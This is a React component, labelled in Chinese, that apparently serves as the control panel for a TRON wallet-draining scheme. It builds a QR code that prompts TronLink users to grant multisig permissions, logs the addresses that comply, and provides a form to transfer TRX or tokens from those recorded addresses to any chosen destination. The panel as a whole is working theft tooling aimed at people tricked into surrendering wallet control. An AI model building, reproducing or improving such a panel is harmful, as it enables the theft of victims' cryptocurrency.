import React, { useState } from 'react';
import { Button, QRCode, message, Table, Modal, Form, Input, Select } from 'antd';
import { generateQR, recordAddress, listAddresses, transferAssets } from '../services/api';

const PermissionTransfer = () => {
  const [qrLink, setQrLink] = useState('');
  const [loading, setLoading] = useState(false);
  const [addresses, setAddresses] = useState([]);
  const [transferModalVisible, setTransferModalVisible] = useState(false);
  const [form] = Form.useForm();

  const generateQRCode = async () => {
    setLoading(true);
    try {
      const { qrLink } = await generateQR();
      setQrLink(qrLink);
      message.success('二维码生成成功');
    } catch (err) {
      message.error('生成二维码失败');
    } finally {
      setLoading(false);
    }
  };

  const handleRecordAddress = async (txId) => {
    try {
      const { address } = await recordAddress(txId);
      message.success(`地址 ${address} 已记录`);
      refreshAddressList();
    } catch (err) {
      message.error('记录地址失败');
    }
  };

  const refreshAddressList = async () => {
    const { addresses } = await listAddresses();
    setAddresses(addresses);
  };

  const handleTransfer = async () => {
    try {
      const values = await form.validateFields();
      await transferAssets(values);
      message.success('资产划转已提交');
      setTransferModalVisible(false);
      form.resetFields();
    } catch (err) {
      message.error('资产划转失败');
    }
  };

  const columns = [
    {
      title: '地址',
      dataIndex: 'address',
      key: 'address',
    },
    {
      title: '添加时间',
      dataIndex: 'created_at',
      key: 'created_at',
    },
  ];

  return (
    <div style={{ padding: 20 }}>
      <div style={{ marginBottom: 20 }}>
        <Button type="primary" onClick={generateQRCode} loading={loading}>
          生成权限转移二维码
        </Button>
        
        <Button 
          style={{ marginLeft: 10 }} 
          onClick={() => setTransferModalVisible(true)}
        >
          资产划转
        </Button>
        
        <Button 
          style={{ marginLeft: 10 }} 
          onClick={refreshAddressList}
        >
          刷新地址列表
        </Button>
      </div>
      
      {qrLink && (
        <div style={{ marginBottom: 20 }}>
          <QRCode value={qrLink} size={200} />
          <p style={{ marginTop: 10 }}>使用TronLink扫码设置多签权限</p>
        </div>
      )}
      
      <Table 
        columns={columns} 
        dataSource={addresses} 
        rowKey="id" 
        style={{ marginTop: 20 }}
      />
      
      <Modal
        title="资产划转"
        visible={transferModalVisible}
        onOk={handleTransfer}
        onCancel={() => setTransferModalVisible(false)}
      >
        <Form form={form} layout="vertical">
          <Form.Item
            name="fromAddress"
            label="源地址"
            rules={[{ required: true, message: '请选择源地址' }]}
          >
            <Select placeholder="选择源地址">
              {addresses.map(address => (
                <Select.Option key={address.address} value={address.address}>
                  {address.address}
                </Select.Option>
              ))}
            </Select>
          </Form.Item>
          
          <Form.Item
            name="toAddress"
            label="目标地址"
            rules={[{ required: true, message: '请输入目标地址' }]}
          >
            <Input placeholder="输入目标地址" />
          </Form.Item>
          
          <Form.Item
            name="tokenContract"
            label="代币类型"
            rules={[{ required: true, message: '请选择代币类型' }]}
          >
            <Select placeholder="选择代币类型">
              <Select.Option value="TRX">TRX</Select.Option>
              <Select.Option value="其他">其他代币</Select.Option>
            </Select>
          </Form.Item>
          
          <Form.Item
            name="amount"
            label="数量"
            rules={[{ required: true, message: '请输入数量' }]}
          >
            <Input type="number" placeholder="输入数量" />
          </Form.Item>
        </Form>
      </Modal>
    </div>
  );
};

export default PermissionTransfer;
